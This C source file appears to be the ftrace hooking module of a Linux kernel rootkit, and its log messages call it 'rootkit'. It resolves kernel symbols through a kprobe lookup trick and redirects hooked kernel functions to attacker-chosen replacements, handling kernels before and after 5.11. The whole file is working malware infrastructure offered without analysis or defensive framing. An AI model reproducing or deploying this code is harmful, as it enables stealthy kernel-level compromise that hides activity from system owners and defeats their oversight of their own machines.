#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "hook.h"

int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "rootkit: Unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;

    return 0;
}

#ifdef NEW_KERNEL
void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
#else
void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
#endif
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#ifdef NEW_KERNEL 
    regs->regs.ip = (unsigned long) hook->function;
#else
    regs->ip = (unsigned long) hook->function;
#endif

}

int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;
    hook->ops.func = fh_ftrace_thunk;
#ifdef NEW_KERNEL    
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION   // 5.11 内核的标志位名称已更改
            | FTRACE_OPS_FL_IPMODIFY;
#else
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION_SAFE
            | FTRACE_OPS_FL_IPMODIFY;
#endif


    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);

    if(err)
    {
        printk(KERN_DEBUG "rootkit: Ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: Register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: Unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: Ftrace_set_filter_ip() failed: %d\n", err);
    }
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
	int err;
	size_t i;

	for (i = 0 ; i < count ; i++)
	{
		err = fh_install_hook(&hooks[i]);
		if(err)
			goto error;
	}
	return 0;

error:
	while (i != 0)
	{
		fh_remove_hook(&hooks[--i]);
	}
	return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
	size_t i;

	for (i = 0 ; i < count ; i++)
		fh_remove_hook(&hooks[i]);
}